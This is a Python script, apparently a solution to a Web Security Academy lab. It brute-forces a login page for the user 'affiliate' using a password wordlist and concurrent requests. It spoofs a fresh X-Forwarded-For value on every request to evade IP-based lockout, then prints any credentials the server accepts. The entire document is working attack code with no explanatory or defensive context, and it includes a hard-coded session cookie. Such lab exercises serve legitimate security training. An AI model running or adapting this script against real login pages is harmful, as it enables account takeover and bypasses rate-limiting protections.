import aiohttp
import asyncio

url = 'https://acb41ff31f9a38cbc089283600e500d2.web-security-academy.net/login'
cookies = {'session': 'jwNUGKodLETvJPIo90A9DviNdcyU1MXa'}

async def test_password(session, name, password, num):
    data = {'username': name, 'password': password}
    headers = {'X-Forwarded-For': f"{num}"}
    async with session.post(url=url, data=data, headers=headers) as resp:
        text = await resp.text()
        return (name, password, 'Invalid' in text)

async def main():
    async with aiohttp.ClientSession(cookies=cookies) as session:
        valid_names = ['affiliate']

        tasks = []
        count = 1000
        for name in valid_names:
            with open('passwords.txt', 'r') as f:
                for password in f.readlines():
                    tasks.append(asyncio.ensure_future(test_password(session, name, password.strip(), count))) 
                    count += 1

        res = await asyncio.gather(*tasks)
        for name, password, invalid in res:
            if not invalid:
                print(f"Found credentials {name}:{password}")

asyncio.run(main())
